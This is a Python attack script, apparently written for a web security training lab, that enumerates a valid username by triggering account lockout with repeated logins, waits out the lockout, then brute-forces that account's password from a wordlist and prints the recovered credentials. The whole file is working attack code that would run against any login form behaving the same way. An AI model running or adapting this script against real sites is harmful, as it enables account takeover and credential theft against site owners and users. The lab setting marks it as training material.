from asyncio.windows_events import NULL
from time import sleep
import requests
import sys
from colorama import Fore, Style

print(Style.RESET_ALL)

if len(sys.argv) > 1:
    lab_url = sys.argv[1]
else:
    print("Usage" + sys.argv[0] + " lab_URL")
    print("Example :- " + sys.argv[0] +" https://ac931f751e78bf8ac0bd5d8e00610022.web-security-academy.net")
    exit()

def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        sleep(1)
        t -= 1



user_list = []

with open('user.txt', 'r') as usernames:
    x = usernames.read()
    user_list = x.split("\n")


pass_list = []

with open('pass.txt', 'r') as passes:
    y = passes.read()
    pass_list = y.split("\n")

url = lab_url + ":443/login"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": lab_url, "Referer": lab_url + "/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}


for users in user_list:
    for i in range(0,5):
        data2 = {"username": users, "password": NULL}
        r = requests.post(url, headers=headers, data=data2, allow_redirects=False)
        if "Invalid username or password" not in r.text:
            print("================ + Lockout + ================== + User {0}".format(users))
            valid_username = users
            break
    else:
        continue
    break

print("Wait for account lockout to end.")
print("Valid username may be {0}".format(str(valid_username)))
t = 65
countdown(int(t))
print("Password spray started.")

for creds in pass_list:
    data2 = {"username": valid_username, "password": creds}
    r = requests.post(url=url, headers=headers, data=data2, allow_redirects=False)
    if "Invalid username or password." in r.text:
        print("================ [-] Failed ==============  Username tried {0} and Password tried {1} ====".format(str(valid_username), str(creds)))
    elif "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in r.text:
        print("================ [-] Failed ==============  Username tried {0} and Password tried {1} ====".format(str(valid_username), str(creds)))
    else:
        print(Fore.RED + "================ [+] Pwned ==============  Username is {0} and Password is {1} ====".format(str(valid_username), str(creds)))
        print(Style.RESET_ALL)
        break       

sleep(5)